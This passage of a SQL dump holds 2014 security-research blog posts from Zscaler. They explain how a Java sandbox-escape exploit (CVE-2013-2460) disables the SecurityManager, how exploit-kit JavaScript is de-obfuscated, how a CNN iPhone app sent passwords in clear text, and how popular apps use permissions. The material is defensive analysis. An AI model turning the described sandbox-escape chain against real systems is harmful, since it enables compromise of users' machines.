\r\n\r\n\r\nActive C2 Server location and ASN information\r\n\r\n \r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\nBelow is the trend of C2 callbacks we have intercepted in past seven days:\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\nOne of the most active C2 server IP addresses also appeared to be the Control server for a Zeus in the mobile (Zitmo) variant in the past as seen below:\r\n \r\n\r\n\r\n \r\nThis further re-affirms the fact that the same gang is involved.\r\n\r\nConclusion\r\n\r\nThis new Gameover Zeus variant certainly appears to be the beginning of a comeback attempt for this notorious Banking Trojan Botnet family, but in many ways it has been a step backward. The number of infections are still very low and it has a long way to go to reach the infection rates observed prior to the Government takedown. Zscaler ThreatLabZ will continue to monitor the activities of this Botnet family in the coming months for active C2 servers as well as any feature updates and will ensure protection for customers.\r\n\r\n- Deepen Desai', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/look-new-gameover-zeus-variant');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (180, 'Dissecting The CVE-2013-2460 Java Exploit', 'Sameer Patil', 'July 28, 2014', 'Introduction    In this vulnerability, code is able to get the references of some restricted classes which are cleverly used for privilege escalation and bypassing the JVM sandbox. The vulnerable “invoke” method of the “sun.tracing.ProviderSkeleton” class is used to issue calls to the Class.forName() method for loading internal restricted classes and methods.         Vulnerability Exploitation Procedure    To define tracepoints in any Java application, one must extend the Provider interface in their program. Creating a Provider instance is done with the help of the factory class ProviderFactory. ProviderSkeleton gives all the implementation needed by a framework provider by implementing two important interfaces, namely “com.sun.tracing.Provider” and “java.lang.reflect.InvocationHandler”. As mentioned earlier, it also has the implementation of our target “invoke” method. Invoke is the default invocation handler associated with Provider class and is created when we call the “Java.reflect.Proxy.GetInvocationHandler()” method with a Provider class object as parameter.    So, the code for this would be:      	  		  			  			<Invoke object> = class.forname(java.lang.reflect.Proxy).getmethod(getInvocationHandler), new Class[] { Class.forName(java.lang.Object) }).invoke(Class.forName(java.lang.reflect.Proxy)), new Object[] { <Provider object> });    			   			  		  	           Class.forName():    Class.forName is the dynamic Class Loader in Java. It initializes a class by calling it’s static methods and constructors, if the class was not previously not being loaded.    The following restricted classes are loaded in the exploit using the <invoke object>:      	     “sun.org.mozilla.javascript.internal.Context”  	     “sun.org.mozilla.javascript.internal.DefiningClassLoader”  	     “sun.org.mozilla.javascript.internal.GeneratedClassLoader”           MethodHandles.Lookup()    There is a call to the “MethodHandles.Lookup()” method which does the AccessController checks only while creating the class instance and not each time the call is made. A lookup object has the capability to access any method handle that the caller has access to.    Context stores some information about the program like the call stack. To associate the newly created context with the current thread, an object of the “enter()” method of the “sun.org.mozilla.javascript.internal.Context” class is created using the lookup object we created. Similarly, method objects for “defineClass()” and “createClassLoader()” from the other two classes are also created. All these three objects are eventually used to disable the SecurityManager enforced by the browser for running Java code.         Privilege Escalation!    Typically, a web applet runs with the SecurityManager provided by the browser. This way, user code does not have the privileges to disable it. In our case, we are able to invoke restricted browser libraries and generate a new ClassLoader. So, this ClassLoader is of the same context as that of the SecurityManger. Finally, defineClass loads the binary object of another class using the privileged ClassLoader and sets the SecurityManager to null after it has successfully performed the bytecode verification.    We will get into this more when we go through each step in detail.         Test Case: Flashpack EK    The malicious jar files we found in multiple exploit kits (EKs) use different types of obfuscation to make them undetectable. In this blog, I will be explain the analysis of a jar file we found in the Flashpack EK, which was using the same exploit. The file can also be downloaded here.    The jar file runs as an applet in the browser and is triggered from the EK’s landing page after it has checked the Java version installed. The jar contains following classes:                  Java Code Deobfuscation Routine:    Code generates strings from garbage text by calling “crock.zam()”. The following three methods perform all of the deobfuscation routine:              The entry point class “a1.class” needs the following three parameters: “urla”, “t” and “tt”. The code proceeds with creating an object of “crock.class” and calling “badafzew()” method.                   In “crock.badafzew()” creation of following three objects takes place:      	The contents of “pashka.class” is fetched as a stream and stored in a byte array object of size 8KB, but it is utilized later in the program for disabling the SecurityManager.   	In the next step, “b3333.cadvsfew()” is called in which the Provider object is created using the ProviderFactory mechanism.  	A call to GetInvocationHandler() returns an object of the vulnerable “invoke()” method.      The execution is then transferred to “nano.allokas()”,passing all three objects created as parameters.  In the “allokas()” method, an object of “cve.class” in created,which gives us the followingtwo important static method objects:             The invoke() method object is used for the first time to generate class objects of two restricted classes as follows:             Using these class objects, two method objects are created for enter() and createClassLoader()methods.              The last step is to perform an invoke action on the “sun.org.mozilla.javascript.internal.DefiningClassLoader” methodhandle and pass a byte object of “pashka.class” as a parameter. This results in successful disabling of the SecurityManager.              Now that the SecurityManager is disabled, the applet is free to perform privileged actions like saving files on the user machine, downloading data and performingfile execution. All this workflow is performed in “nasa.class”, which I am not discussing in this blog as it is easily understandable as shown below.                   JavaScript Deobfuscation:    To prepare a POC of the exploit, along with the jar file, the html page calling the applet is also important, because it sends the parameters needed for jar execution. But exploit kit landing pages are found to be highly obfuscated and it’s not at all easy to decode the parameters.    In case of Flashpack, we filtered the following traffic:             	  		  			   		  	             After deobfuscating the JS and extracting some useful content, we get:          	  		  			   		  	           Yara Signature:     Even though the jar files used by EKs have highly obfuscated code, some of the strings still can’t be obfuscated and we can use such patterns in our static analysis. And if we are lucky, we can develop accuratedetection methods. The following signature can be used for exploit identification on a decompiled jar file.', 'Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/dissecting-cve-2013-2460-java-exploit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (181, 'De-obfuscating The DOM Based JavaScript Obfuscation Found In EK’s Such As Fiesta And Rig', 'ThreatLabz', 'July 23, 2014', 'There is little doubt that exploit kit (EK) developers are continuing to improve their techniques and are making exploit kits harder to detect. They have heavily leveraged obfuscation techniques for JavaScript and are utilizing browser functionality to their advantage. Recent exploit kits such as ‘Fiesta’ and ‘Rig’ for example, have been found to be using DOM based JavaScript obfuscation. In this blog I will demonstrate a simple approach to de-obfuscate DOM based JavaScript obfuscation.\r\n\r\nBefore we dive in, it’s important to understand the difference between older EK’s such as Blackhole and Incognito versus newer ones such as Fiesta and Rig. A key difference between them is the way they de-obfuscate code in the victim’s browser. The newer approach de-obfuscates JavaScript snippets and stores them into DOM by building an element tree. Older EK’s by contrast were heavily using JavaScript functions such as ‘eval’and ‘document.write’ to de-obfuscate the JavaScript. \r\n\r\nLet’s start by taking a look at a Rig EK sample. \r\n\r\nRig EK page:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Heavy obfuscation of Rig EK JavaScript code\r\n		\r\n	\r\n\r\n\r\nUnlike most EK’s, instead of running plugin detection code first, it instead starts by checking for the presence of Kaspersky and TrendMicro antivirus (AV) programs. If any of the AV driver files are found on the victim’s machine, the exploit execution stops. In order to check for the presence of these driver files, the EK uses the ActiveX object ‘Microsoft.XMLDOM’. The routine labeled ‘df3z’ does the inspection.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			AV driver checking code\r\n		\r\n	\r\n\r\n\r\n Driver file information:\r\n\r\n Take note of the following statement,\r\n\r\n\r\n\r\n\r\nThe above value of variable ‘sdf43w’ is used later on in the JavaScript. \r\n\r\n \r\n\r\nIf no AV driver for Kaspersky or TrendMicro is found on the victim’s machine, the code then initializes the de-obfuscation routine. First the Javascript creates a ‘div’ element and appends it to the DOM. The remaining JavaScript, which is heavily obfuscated contains exploit code targeting vulnerabilities for Java, Flash and SilverLight browser plug-ins.\r\n\r\n \r\n\r\nFirst JavaScript:\r\n\r\nLet’s take a look at the JavaScript code to understand how it’s building the DOM element tree.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			First JavaScript\r\n		\r\n	\r\n\r\n\r\nTo summarize,\r\n\r\n\r\n	Function ‘alz’ concatenates a string passed to it and assigns the concatenated string to the ‘ty6’ variable. This is later used by the de-obfuscation routine. \r\n	Element ‘dn3d’with a type of “script” is created.\r\n	De-obfuscated (final) JavaScript is assigned to the element ‘dn3d.text\'.\r\n	Element ‘dn3d’is appended to the ‘document.body’ i.e into the DOM tree for later execution.\r\n\r\n\r\nTo get the de-obfuscated code for this JavaScript we need to get the value of ‘dn3d.text’. For that I added a line called ‘console.log(‘dn3d- 1: ‘ + dn3d.text)’. I am using the Google Chrome browser to complete de-obfuscation and all of the analysis is carried out in an isolated environment. To get the console logs, you need to open developer tools in Google Chrome browser.  Apart from console.log you can also leverage other JavaScript functions like ‘alert’ or ‘document.write’ to get the de-obfuscated code\r\n\r\n.\r\n\r\nDe-obfuscated code for first JavaScript segment:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Output\r\n		\r\n	\r\n\r\n\r\nThe beautified version is shown below:\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nHere you can see the value of ‘dn3d.text’ is a JavaScript, which is then, is added into DOM tree. This JavaScript contains function ‘dsg45’, which creates element ‘bd6’ of type ‘div’ and appends it to DOM tree and also assigns a passed value of variable ‘hgd1’ using property ‘innerHTML’ of the created element.\r\n\r\n \r\n\r\nAll the remaining obfuscated JavaScript is structured like the aforementioned code. The following shows the second snippet of JavaScript, which actually contains the malicious applet code.\r\n\r\n \r\n\r\nSecond JavaScript snippet: Exploits Java vulnerability\r\n\r\n \r\n\r\n\r\n\r\n\r\nAgain, I’ve added a ‘console.log’ function to get the de-obfuscated JavaScript, which later will be appended to DOM tree and will be executed.\r\n\r\n \r\n\r\nDe-obfuscated code for the Second JavaScript snippet:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Malicious Applet Code\r\n		\r\n	\r\n\r\n\r\nYou can see above, the malicious applet code is assigned to variable ‘jg67fgf’. This value is then passed to JavaScript function ‘dsg45’, which was appended into the DOM tree by the first JavaScript snippet (see above).\r\n\r\n \r\n\r\nSimilarly the remaining two JavaScript snippets are de-obfuscated using the aforementioned method.\r\n\r\n \r\n\r\nDe-obfuscated code for the third JavaScript snippet: Exploits Silverlight vulnerability\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Malicious SilverLight Code\r\n		\r\n	\r\n\r\n\r\nDe-obfuscated code for the fourth JavaScript snippet: Exploits Flash vulnerability\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Malicious Flash Code\r\n		\r\n	\r\n\r\n\r\nTo get all of the de-obfuscated code above I would normally need to conduct code analysis to find the ‘dn3d.text’ variable, which contains the de-obfuscated JavaScript code. This would require fair bit of code analysis and understanding of JavaScript and DOM. As such, I wanted to find a simple solution which would provide all of the de-obfuscated JavaScript at once. Fortunately, I was able to identify a shortcut. Since all of the de-obfuscated JavaScript is stored in DOM tree, we can crawl the DOM tree and get the element value once for all of the EK script has executed. For this, I wrote a simple JavaScript routine which I call ‘domWalkerAndDeobfuscator’. By putting this code at the end of the EK sample, we can get all the JavaScript being stored into DOM, which in turn contains the de-obfuscated code.\r\n\r\n \r\n\r\ndomWalkerAndDeobfuscator at the end of EK:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			domWalkerAndDeobfuscator\r\n		\r\n	\r\n\r\n\r\n‘console.log’ output after appending domWalkerAndDeobfuscator:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\nMalicious Applet code:\r\n\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n Malicious Silverlight code:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\nMalicious Flash code:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\nMy trick worked and gave me the full de-obfuscated code of the Rig EK sample. This increased my curiosity and tried the same ‘domWalkerAndDeobfuscator’ on the Feista exploit kit sample.\r\n\r\n  \r\n\r\nFiesta EK:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fiesta EK\r\n		\r\n	\r\n\r\n\r\nDe-obfuscated code obtained from ‘domWalkerAndDeobfuscator’ through console.log for Feista EK:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\nThe Feista EK also contains exploit code for Java, Flash and SilverLight plugins.\r\n\r\n \r\n\r\nAdding a simple DOM walker (crawler) script made the job easy of de-obfuscating DOM based obfuscated EK far easier. I’ve tested the approach with samples of Rig and Fiesta so far and every time was able to get the de-obfuscated code in seconds instead of doing the heavy lifting required for manual analysis.\r\n\r\n \r\n\r\nConclusion: Previously with older EK’s it was easy to de-obfuscate the code using many online tools and with manual analysis, but due to the introduction of DOM based obfuscation techniques the difficulty has increased. Many tools are failing to de-obfuscate the code for newer EK samples. Fortunately, the approach of walking the DOM solved the issue in seconds. \r\n\r\n \r\n\r\nPradeep', 'Adobe;Analysis;Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/de-obfuscating-dom-based-javascript-obfuscation-found-eks-such-fiesta-and-rig');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (182, 'Mobile App Wall Of Shame: CNN App For IPhone', 'Viral Gandhi', 'July 21, 2014', 'Price: Free\r\n\r\n\r\n\r\nCategory: News\r\nUpdated: Jul 11, 2014\r\n\r\nVersion: Version 2.30 (Build 4948)\r\n\r\nSize: 21.8 MB\r\n\r\nLanguage: English\r\n\r\nVendor: CNN Interactive Group, Inc.\r\nOperating System: iOS\r\n\r\nBackground\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			iReport account setting\r\n		\r\n	\r\n\r\nThe CNN App for iPhone is one of the most popular news applications available for the iPhone. At present, it is sitting at #2 in the iTunes free News app category and #165 among all free apps. Along with providing news stories, alerts and live video, it also includes iReport functionality, allowing users to upload photos, video and narrative to contribute to CNN news reports. The functionality includes the ability to register for an account by providing an email address, username and password. Users can optionally provide a real name and phone number. Logging into an existing iReport account or creating a new account can be accessed via More à Settings àiReport in the main menu. The user can then access the iReport Assignments section, which is accessible via This is CNNàiReport in the main Menu.\r\n\r\n\r\n\r\nVulnerability – Clear Text Passwords\r\n \r\n\r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			iReport Functionality\r\n		\r\n	\r\n\r\nThe current CNN for iPhone App (verified on Version 2.30 (Build 4948)) has a key weakness whereby passwords for iReportaccounts are sent in clear text (unencrypted). While this is always a problem, it\'s especially concerning that this relates to functionality which permits people to anonymously submit news stories to CNN. This occurs both when a user first creates their iReport account and during any subsequent logins. Traffic sniffed from the app using Zscaler\'s free ZAPtool illustrates the problem.\r\n \r\n\r\n\r\n\r\n\r\n\r\n\r\nInitial Account Registration\r\n\r\n \r\n\r\n[-]  Method: POST\r\n\r\nUrl:http://audience.cnn.com/services/cnn/register.api\r\n\r\nHost:audience.cnn.com\r\n\r\nUser-Agent: CNN/4948 (iPad; iOS 7.1.2; Scale/2.00)\r\n\r\nRequest Body: nowrap=true&termsOfService=true&displayname=zscaler&password=p%40ssword&privacy=domestic_version&email=zscalertest%40zscaler%2Ecom&kaptcha=3dbgc\r\n\r\n \r\n\r\nSubsequent Login\r\n\r\n \r\n\r\n[-]  Method: POST\r\n\r\nUrl:http://audience.cnn.com/services/cnn/login.api\r\n\r\nHost:audience.cnn.com\r\n\r\nUser-Agent: CNN/4948 (iPad; iOS 7.1.2; Scale/2.00)\r\n\r\nRequest Body: doSso=false&password=p%40ssword&email=zscalertest%40zscaler%2Ecom&nowrap=true\r\n\r\nServer Response:{ , \"status\":\"success\"}\r\n\r\n \r\n\r\nAs can be seen, both transmissions are sent in clear text (HTTP) and the password (p@ssword) is sent unencrypted, along with all other registration/login information. The concern here is that anyone on the same network as the user could easily sniff the victim\'s password and access their account. Once obtained, the attacker could access the iReport account of the user and compromise their anonymity. The same credentials could be used to access the user\'s web based iReport account where any past submissions are also accessible.\r\n\r\nZAP Analysis:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			ZAP analysis\r\n		\r\n	\r\n\r\nWe have tested other CNN mobile apps and found that the Android app does not have this same vulnerability as it uses both SSL encryption for registration/login and SSL certificate pinning. The iReport functionality is not present in the CNN iPad application. The vulnerability was reported to CNN on July 15th. They acknowledged receipt of the report and indicated that they are investigating.\r\n\r\nConclusion\r\n \r\n\r\n \r\n\r\nUnfortunately, it isn’t difficult to identify mobile applications that send authentication credentials in clear text. As mentioned, this was easily identified in a few minutes leveraging ZAP. For end users however, such flaws aren’t as evident. In a web application, a user knows immediately when sensitive information is sent in clear text, as they don’t see the familiar lock and key symbol in their browser or HTTPS in the URL bar. Such feedback is not available in a mobile application, despite the fact that it is sending the same content. End users must rely on both the app developers and app store gatekeepers to prevent such flaws from being exposed in the first place. This vulnerability could easily have been caught by Apple during the vetting process that they subject new applications to before including them in the app store, but our research has shown us that Apple and Google simply aren’t looking for these basic security vulnerabilities.\r\n\r\nNote:\r\nAs this issue was reported to CNN by us, CNN rolled out new updates and fix for this vulnerability. CNN app new version (2.3.1) no longer vulnerable to this issue.', 'Analysis;Encryption;Mobile;Mobile Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-cnn-app-iphone');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (183, 'The “Forbidden” Apple: App Stores And The Illusion Of Control Part I', 'Viral Gandhi', 'July 15, 2014', 'There is no doubt we truly live in an “App Economy.” From personal to professional, we direct and live our lives through our smart phones. But while we enjoy the latest games, stream the latest content or catch up on our friend\'s activities, few think about the “App Dichotomy”– The fact that we are at least as much the consumed, as we are the consumer. This is the first in a pair of blogs that break down and analyze the access we grant to our personal information, behaviours and tendencies when we download an App, and the security and privacy risks that result.\r\n \r\n\r\nFirst, we will examine the privacy/security profiles of the most popular iOS apps in the Apple App Store. Apple of course presents an image of a walled and pristine garden where users are safe unless you “bite the apple” and jailbreak your device, exposing it to the evils of unapproved apps. Apple also holds an advantage over Google/Android in that it offers more granular allow/deny control over specific permissions, while still allowing a user to download and use an app.  However, it’s well understood that many users do not scrutinize the permissions requested regardless of choices. And for those who do, even with a cursory review, do they understand what they grant when they click “allow”?\r\n\r\nZscaler to date, has analyzed the top 550 most popular iOS apps, via static analysis techniques, specifically tracking permissions for access to functionality such as: the address book, telephony information (carrier, country code, SIM card info., etc.), user geo-location, calendar, email and unique identifiers. One difference in the approach that we’ve taken, in contrast to previously published statistics that we’ve seen, is that we looked for the express use of various functions to determine that an app actually required specific levels of access. We often see stats based on only the inclusion of a framework within an app. While including the framework provides the app with the ability to access specific functionality, it is common for developers to be aggressive with the frameworks that they include but never actually leverage the functionality.There are many interesting findings in the data, but two findings that we found especially concerning were:\r\n\r\n \r\n\r\n\r\n	38% of applications still have access to the now infamous UDID identifier, that was the center of the AntiSec leak in 2012, and since which time, Apple has banned access. Access to UDIDs is a concern because developers could track user behaviour across multiple apps to track unique user. Developers and ad networks may also map UDIDs to user\'s sensitive information like mobile numbers,name passwords, locations and other information.\r\n	In excess of 60% of Game and Entertainment apps request permission to telephony functions (service provider information and current call information) and geo-location.This is of course more of a privacy concern, than security, but troubling nonetheless. This concerns are important as previously some issues came to light regarding spying on leaky apps. \r\n\r\n \r\n\r\nOne last item before we dive deep into the analysis that we feel is compelling to point out, is that – somewhat ironically – we had to jailbreak the devices. This was necessary in order to access the applications in their running state, and then identify various functions called by the apps to understand the access permissions that they require. This increases the value and validity of these stats, and in some cases calls into question the accuracy of some of the iOS stats that we\'ve previously seen. Most are based on simply seeing a framework being imported (potential use) vs what we did which was look for the use of individual functions (actual use).\r\n \r\n\r\nSo, on to the analysis. We have compiled stats for:\r\n\r\n \r\n\r\n \r\n\r\n\r\n	Address book functionality - Provides a programing interface to the Address book in order to allow an application to access the Addressbook database\r\n	Telephony data information - Provides details on usage of the core telephony framework’s methods, which include access to the cellular service provider information like the cellular service carrier and current call information\r\n	Location tracking - Allows apps to determine user’s current location or heading\r\n	Email Functionality - Usage of the MFMailComposeViewController class’s methods, which provide a standard interface to manage the editing and sending of email messages. With this access, an app would not be able to send mails independently, without user involvement. The app would also not be able to read a user\'s email.\r\n	Calendar data - Allows applications to read/write from/to Calendars, Events and Reminders.\r\n	UUID - Apps can access UUIDs (Universally Unique Identifiers), also known as GUIDs (Globally Unique Identifiers) or IIDs (Interface Identifiers), which are 128-bit values designed to be unique per device.\r\n\r\nThe following overall results were derived from static app analysis:\r\n\r\n\r\n\r\nBelow we see the percentage of applications which are trying to use social media and ad networks. \r\n\r\n\r\n\r\n47% of applications are found to be linked to social networks. We have observed Facebook, Twitter and Instagram as most common social networks used by apps.\r\n\r\n75% of applications are found to be linked to advertisingnetworks. This is not a surprising finding given that all of the apps analyzed were free apps and most have a monetization strategy driven by advertising.\r\n\r\nUDID vs. UUID:\r\n\r\nApple is pushing developers to stop using the unique identifier (UDID) embedded in iPhones and iPads and started rejecting apps that gather UDIDs after May 2013. App developers were warned not to use the “uniqIdentifier”, although it seems that some developers have neglected these warnings. Developers rely on the UDID value to track user activity for targeted advertising and troubleshooting. Since Apple is prohibiting the option to use the unique identifiers, companies are looking for new ways to keep tabs on users while avoiding personal privacy concerns. As an alternative to UDIDs, Apple has instead introduced the UUID (Universally Unique Identifier) created by CFUUIDCreate method, which we will explain below. Since these changes were implemented, developers are now trying to track the user in the following ways:\r\n\r\n \r\n\r\n\r\n	The UDID is tied to the device hardware and no longer permitted by Apple. Apple started rejecting apps which requested the UDID string, although a few legacy apps still exist which use this method.\r\n	The UUID, Apple’s preferred approach is a unique value per app and device. This limits privacy concerns as the user cannot be tracked across apps on a given device. One additional limitation of the UUID is that it is created when the app is first installed and, if the user re-installs the app, a new UUID will be created. In order to get around this limitation, developers are storing the UUID in the user’s keychain to make it persistent across app installs.\r\n	A final option involves querying the MAC address of device. Apple is also now prohibiting the use of MAC addresses tracking. Apple will now reject apps where developers query the MAC address. Additionally, starting with iOS 7, Apple now always returns a fixed value when querying the MAC address to specifically prevent the MAC as base for unique identifier.\r\n\r\nHere are some UDID vs. UUID statistics we derived from our scanned applications.\r\n\r\n\r\n\r\nWe have found 38% of legacy applications are still using the UDID “uniqIdentifier” string which is no longer permitted by Apple. Apple is pushing very hard to ensure that only UUID values are now used in place of UDID and MAC addresses.In support of that, we can see that 92% of apps are now using UUID values to track users.\r\n\r\nStatistics breakdown by App Categories\r\n\r\nThe following details the results of five permission categories from the iTunes store for the top 25+ applications in their respective categories.\r\n\r\nCategory: Games\r\n\r\n\r\n\r\nIn the Games category, we have found that 28% of apps are accessing Address book functionality, 68% of apps are using telephony information, 76% of apps are trying to use the user’s location, 64% apps are using the Email framework and 60% of apps are asking for calendar access. Also, 84% of games are leveraging UUID’s for tracking user activity for targeted advertising.\r\n\r\n                                                Category: Entertainment\r\n\r\n\r\n\r\nIn the Entertainment category, we have observed 20% of apps trying to access address book functionality, 75% of apps are asking for telephony data, 86% of apps are using location APIs to track a user’s location, 88% of apps are using the Email framework and 70% of apps are using calendar data. Additionally, 97% of apps are using UUID’s for tracking.\r\n\r\n                                      Category: Social Networking\r\n\r\n\r\n\r\nIn the Social Networking category, 92% of apps use address book functionality, 72% of apps are asking for telephony information, 96% of apps are using location APIs and the Email framework, while 54% of apps are accessing calendar functionality and 96% of apps track via UUIDs.\r\n\r\n                                      Category: Lifestyle\r\n\r\n\r\n\r\nIn the Lifestyle category, 59% of apps were found to be accessing the address book, 81% of apps are using telephony data, 85% of apps are using the location and Email framework, 51% apps are accessing calendar functionality and all apps scanned were found to be accessing UUIDs.\r\n\r\n                                      Category: Travel\r\n\r\n\r\n\r\nIn the Travel category, we observed 54% of apps with access to the address book, 58% of apps have telephony data access, 92% of apps have access to location information, 77% of apps are using email and 61% of apps are using the calendar framework. Additionally, 92% of apps are leveraging UUIDs.\r\n \r\n\r\nConclusion:\r\n\r\nWith 97% apps using at least one of the functionalities being tracked (address book, telephony, location, email calendar or UUID), as stated, we are being consumed as much, if not more, than we consume.  In and of itself, this is not a danger.  However as threats – and even business practices – evolve, the risk profile of access changes with it. In the case of our findings, while Apple has stated otherwise, it is clear that some developers significantly overreach in permissions requested. And while some “risks” still live inside gates – for example access to Social Media still requires express user permission for an app to post, etc., -- as also stated earlier, many users are click happy and indiscriminate with that permission.  I’ll leave you with a specific access and risk analysis for one app, Draw Something Free.\r\n \r\n\r\nRecommendations:\r\n\r\nTo avoid security and privacy problems, more knowledge about mobile app risk is necessary. As organizations are moving forward with BYOD, infrastructure knowledge of app behaviors helps to avoid security and corporate privacy risks – from location tracking of executives to leaking corporate data.\r\n\r\nUsers and IT always must remain vigilant and aware regarding installed app behaviors. Consider the necessity of any functionality requested by an app before you allow it. For example, why does any game app need to access  your address book? Should an app for kids really be asking for geolocation? Awareness among users about how much access is granted to particular apps is the only way to build the stronger defense against future mobile threats.\r\n \r\n\r\nExample:\r\n\r\nApplication: Draw something free\r\n\r\nMethods identified in the decompiled source code for respective areas of functionality:\r\n\r\n \r\n\r\n\r\n	Address book access:\r\n	ABAddressBookCreate\r\n	ABAddressBookGetAuthorizationStatus\r\n	ABAddressBookRequestAccessWithCompletion\r\n	ABAddressBookSave\r\n	ABAddressBookAddRecord\r\n	ABAddressBookRemoveRecord\r\n	ABRecordGetRecordID\r\n	ABRecordGetRecordType\r\n	ABRecordSetValue\r\n	ABRecordCopyValue\r\n	ABRecordRemoveValue\r\n	ABRecordCopyCompositeName\r\n	ABPersonCreate\r\n	ABPersonGetTypeOfProperty\r\n	ABAddressBookGetPersonWithRecordID\r\n	ABAddressBookCopyArrayOfAllPeople\r\n\r\n \r\n\r\nTelephony Information:\r\n\r\n \r\n\r\n\r\n	carrierName\r\n	carrierName\r\n	mobileCountryCode\r\n	mobileNetworkCode\r\n\r\n \r\n\r\nLocation Access:\r\n\r\n \r\n\r\n\r\n	locationManager:didUpdateLocations:\r\n	locationManager:didUpdateLocations:\r\n	locationManager:didFailWithError:\r\n	locationManager:didFinishDeferredUpdatesWithError:\r\n	locationManager:didUpdateToLocation:fromLocation:\r\n	locationManagerDidPauseLocationUpdates:\r\n	locationManagerDidResumeLocationUpdates:\r\n	locationManager:didUpdateHeading:\r\n	locationManagerShouldDisplayHeadingCalibration:\r\n	locationManager:didEnterRegion:\r\n	locationManager:didExitRegion:\r\n	locationManager:monitoringDidFailForRegion:withError:\r\n	locationManager:didStartMonitoringForRegion:\r\n	locationManager:didChangeAuthorizationStatus:\r\n	initWithLatitude\r\n	horizontalAccuracy\r\n	verticalAccuracy\r\n\r\n \r\n\r\nEmail access:\r\n\r\n \r\n\r\n\r\n	SetSubject\r\n	setToRecipients\r\n	setCcRecipients\r\n	setBccRecipients\r\n\r\n \r\n\r\nCalender access:\r\n\r\n \r\n\r\n\r\n	defaultCalendarForNewEvents\r\n	removeEvent\r\n	saveEvent\r\n\r\n \r\n\r\nUnique Identifier (UUID) access:\r\n\r\n \r\n\r\n\r\n	uniqueIdentifier\r\n	CFUUIDCreateString\r\n	CFUUIDCreate\r\n\r\n \r\n\r\nAd network related URLs found in source code:\r\n\r\n \r\n\r\n\r\n	http://www.flurry.com/resources/privacy/reengagement.html\r\n	http://www.googleanalytics.com/__utm.gif\r\n	utmwv=4.4mi&amp;utmn=%d&amp;utmt=event&amp;utme=5\r\n	http://www.google.com/OAuthCallback\r\n	http://www.googleadservices.com/pagead/aclk\r\n	https://data.flurry.com/aas.do\r\n	https://et.w.inmobi.com/user/e.asm\r\n\r\n \r\n\r\nSocial Network related URLs found in the source code:\r\n\r\n \r\n\r\n\r\n	http://twitter.com/WeDrawSomething\r\n	http://www.facebook.com/playdrawsomething\r\n	https://api.twitter.com\r\n	https://api.twitter.com/1/statuses/update.json\r\n	https://api.twitter.com/oauth/access_token\r\n	https://api.twitter.com/oauth/authorize\r\n	https://api.twitter.com/oauth/request_token\r\n\r\nReferences:\r\n\r\n\r\nhttps://developer.apple.com/library/ios/navigation/\r\n\r\nhttps://developer.apple.com/news/?id=3212013a\r\n\r\nhttp://techcrunch.com/2013/06/14/ios-7-eliminates-mac-address-as-tracking-option-signaling-final-push-towards-apples-own-ad-identifier-technology/', 'Analysis;Mobile Malware', 'https://www.zscaler.com/blogs/research/forbidden-apple-app-stores-and-illusion-control-part-i');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (184, 'And The Mice Will “Play”…: App Stores And The Illusion Of Control Part II', 'Viral Gandhi', 'July 15, 2014', 'In the last blog, we began analyzing what we’ve termed the “App Dichotomy” of the App Economy – The fact that we are at least as much the consumed, as we are the consumer. Our goal was to analyze popular apps from Apple’s App Store and Google Play to determine how permissive developers have tried to be, and the security and privacy risks we accept when we download them to our smartphones. \r\n \r\n\r\nThis blog will look at Android apps from the Google Play store. While Android was once the open and transparent rebel to Apple’s rigid and restrictive iPhone, it has of late taken on more the image of a questionable rogue. While the App Store has been accused of being a bit of a police state, the Play store has been accused of being too loose and lazy with its oversight. And when the cat is away…\r\n \r\n\r\nCompounding concern and creating more privacy risk is the fact that Android operates in an all-or-nothing permission fashion, where users accept the entire laundry list of requested permissions or the app cannot be downloaded. This model likely has more users putting less scrutiny on permissions to achieve that instant app gratification.\r\n \r\n\r\nFor this analysis, Zscaler analyzed more than 75,000 apps from the Google Play store in order to determine the permissions that are commonly 